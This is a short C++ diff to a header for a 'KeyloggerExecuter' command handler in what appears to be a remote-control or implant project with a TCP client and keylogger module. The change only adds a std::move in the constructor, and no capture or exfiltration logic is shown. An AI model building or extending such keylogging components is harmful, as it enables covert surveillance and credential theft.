@@ -1,5 +1,7 @@
 #pragma once
 
+#include <utility>
+
 #include "command/interface/ICommandExecuter.h"
 #include "networking/interfaces/ITCPClient.h"
 #include "methods/keylogger/Keylogger.h"
@@ -18,7 +20,7 @@ public:
     KeyloggerExecuter(tag_t tag,
                       methods::keylogger::Keylogger keylogger)
         : ICommandExecuter(tag),
-          m_keylogger(keylogger)
+          m_keylogger(std::move(keylogger))
     {}
     virtual ~KeyloggerExecuter() = default;
 
